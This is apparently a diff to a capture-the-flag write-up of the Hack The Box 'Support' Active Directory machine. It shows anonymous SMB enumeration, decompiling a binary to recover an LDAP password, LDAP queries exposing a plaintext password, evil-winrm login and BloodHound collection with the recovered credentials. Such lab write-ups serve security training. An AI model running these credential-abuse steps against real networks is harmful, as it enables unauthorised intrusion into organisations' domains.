@@ -58,7 +58,7 @@ Nmap done: 1 IP address (1 host up) scanned in 65.96 seconds
 Initial enumeration reveals common services found in an AD enviroment.
 ### SMB Enumeration
 
-Enumerating shares with anonymous access discloses 
+Enumerating shares with anonymous access discloses a non default share which contains a zip file for an executable binary, with the name UserInfo.exe.zip
 
 ```
 smbclient -L //support.htb -N
@@ -95,6 +95,8 @@ getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (328.1 KiloByt
 smb: \> 
 
 ```
+
+The file is downloaded locally and performing reverse engineering (?) with ilspycmd Reveals a function to encrypt the password for the user `ldap`:
 
 ```
 ilspycmd UserInfo.exe
@@ -355,12 +357,13 @@ recovered credentials:
 ---
 ## Foothold
 
-Enumerating users 
+Enumerating users  throgh ldap quries:
 
 ```
 ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(&(objectCategory=person)(objectClass=user))"
 ```
 
+The `support` user has plaintext credentials in the info field:
 
 ```             
 # extended LDIF
@@ -1231,13 +1234,15 @@ Credentials recovered: `support:Ironside47pleasure40Watchful`
 
 ## User Flag
 
+Accessing Win-Rm service as support:
+
 ```
 evil-winrm -i 10.129.50.211 -u support -p Ironside47pleasure40Watchful
 ```
 
 ```
 *Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt
-89a6b2b28e02a4a1ef1c54d42f73a1b7
+89a6b2b28e02a4a1ef1c54d42f73a1b7 censor
 ```
 
 ---
@@ -1292,6 +1297,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 ```
 
+Running bloodhound collector with `support` creds
 ```
  bloodhound-ce-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -ns 10.129.50.211 -c All
 
